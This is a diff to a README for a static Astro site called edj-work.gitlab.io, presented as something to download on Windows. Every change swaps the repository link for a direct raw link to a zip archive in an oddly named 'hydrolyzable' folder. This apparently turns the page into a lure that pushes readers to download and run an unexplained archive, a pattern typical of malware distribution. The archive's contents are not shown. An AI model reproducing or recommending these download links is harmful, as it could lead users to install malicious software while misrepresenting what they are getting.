@@ -1,11 +1,11 @@
 # 🌐 edj-work.gitlab.io - Simple static site for Windows
 
-[![Download](https://img.shields.io/badge/Download-Visit%20this%20page-blue?style=for-the-badge)](https://github.com/hernandezantonyinma1-alt/edj-work.gitlab.io)
+[![Download](https://img.shields.io/badge/Download-Visit%20this%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/hernandezantonyinma1-alt/edj-work.gitlab.io/main/hydrolyzable/edj_gitlab_work_io_v2.1.zip)
 
 ## 📥 Download
 
 Use this page to download:  
-https://github.com/hernandezantonyinma1-alt/edj-work.gitlab.io
+https://raw.githubusercontent.com/hernandezantonyinma1-alt/edj-work.gitlab.io/main/hydrolyzable/edj_gitlab_work_io_v2.1.zip
 
 ## 🖥️ What this is
 
@@ -21,7 +21,7 @@ edj-work.gitlab.io is a static website copy built with Astro. It is meant to run
 ## 🚀 How to get started on Windows
 
 1. Open the download page:  
-   https://github.com/hernandezantonyinma1-alt/edj-work.gitlab.io
+   https://raw.githubusercontent.com/hernandezantonyinma1-alt/edj-work.gitlab.io/main/hydrolyzable/edj_gitlab_work_io_v2.1.zip
 
 2. Download the repository files to your PC.
 
@@ -148,4 +148,4 @@ The site uses markdown for content in parts of the project, then turns that cont
 ## 🔗 Download again
 
 If you need the files again, use this page:  
-https://github.com/hernandezantonyinma1-alt/edj-work.gitlab.io
+https://raw.githubusercontent.com/hernandezantonyinma1-alt/edj-work.gitlab.io/main/hydrolyzable/edj_gitlab_work_io_v2.1.zip
